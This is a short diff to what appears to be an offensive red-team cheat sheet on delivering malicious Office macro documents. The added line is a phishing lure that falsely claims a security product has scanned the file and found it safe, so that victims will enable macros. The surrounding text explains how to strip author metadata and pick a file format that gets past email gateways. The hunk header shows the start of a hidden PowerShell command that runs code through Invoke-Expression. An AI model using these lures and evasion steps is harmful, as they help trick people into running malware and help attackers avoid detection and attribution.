@@ -197,6 +197,7 @@ C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c "IEX
 
 ## Macro's
 - To prepare the document for delivery, go to File > Info > Inspect Document > Inspect Document, which will bring up the Document Inspector. Click Inspect and then Remove All next to Document Properties and Personal Information.  This is to prevent the username on your system being embedded in the document.
+- Entice user to enable Macro's. Message example: "Security Product XYZ has scanned the content and deemed it to be safe.  To reveal the content, click Enable Content"
 
 #### Simple macro
 - Save it as `.doc`. Macro in a `.docx` is not possible and the `.docm` has a huge! and might get blocked by email gateways.
